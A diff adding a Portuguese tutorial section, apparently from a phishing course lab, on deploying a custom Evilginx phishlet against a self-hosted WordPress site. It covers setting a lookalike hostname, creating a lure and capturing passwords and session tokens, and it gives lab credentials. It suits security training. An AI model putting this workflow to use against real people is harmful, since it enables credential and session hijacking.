@@ -221,3 +221,74 @@ Você deve ver agora:
 >
 
 
+# **Criar um Phishlet personalizado para WordPress auto-hospedado**
+
+### **Visão geral da solução**
+
+Uma versão funcional do phishlet personalizado está disponível aqui:
+
+[hacksmarter.yaml no GitHub](https://github.com/TeneBrae93/phishing/blob/main/hacksmarter.yaml)
+
+Recomendamos que você faça um fork do repositório, estude o YAML e reutilize essa estrutura para outros alvos de WordPress auto-hospedados.
+
+---
+
+### **Instruções passo a passo para implantação**
+
+### **1. Copie e salve o Phishlet**
+
+No seu Droplet do Digital Ocean:
+
+cd ~/evilginx/phishlets nano hacksmarter.yaml
+
+Cole o conteúdo do arquivo do GitHub e salve com:
+
+`Ctrl + X`, depois `Y`, depois `Enter`.
+
+---
+
+### **2. Inicie o Evilginx**
+
+cd ~/evilginx ./evilginx
+
+---
+
+### **3. Desative quaisquer Phishlets existentes**
+
+phishlets disable wordpress.org phishlets hide wordpress.org
+
+---
+
+### **4. Ative o Phishlet personalizado**
+
+phishlets hostname hacksmarter login.hacksmarter-manufacturing.cam phishlets enable hacksmarter
+
+O Evilginx solicitará certificados TLS e preparará o ambiente de proxy.
+
+---
+
+### **5. Crie a isca**
+
+lures create hacksmarter lures get-url 1 # Substitua pelo ID real da isca, se for diferente
+
+Abra a URL em um navegador. Você deverá ver a **página de login real**, redirecionada de forma invisível pelo Evilginx.
+
+---
+
+### **Da perspectiva da vítima**
+
+Quando um alvo (por exemplo, o usuário *Tony*) faz login usando a isca de phishing:
+
+- Ele é redirecionado para o painel de controle real do WordPress.
+- Seu **nome de usuário** e **senha** são capturados.
+- O Evilginx2 também pode capturar **tokens de sessão**, dependendo da configuração.
+
+---
+
+## **Credenciais do WordPress**
+
+Não altere a senha do usuário, não atualize seu perfil nem execute nenhuma ação, exceto para fazer login e testar. Se você modificar o usuário, será banido de todos os meus cursos futuros.
+
+`Nome de usuário: tony Senha: dafadfgadfgf353434!~#!@DDFG"{"{"!`
+- Seu **nome de usuário** e **senha** são capturados.
+- O Evilginx2 também pode capturar **tokens de sessão**, dependendo da configuração.
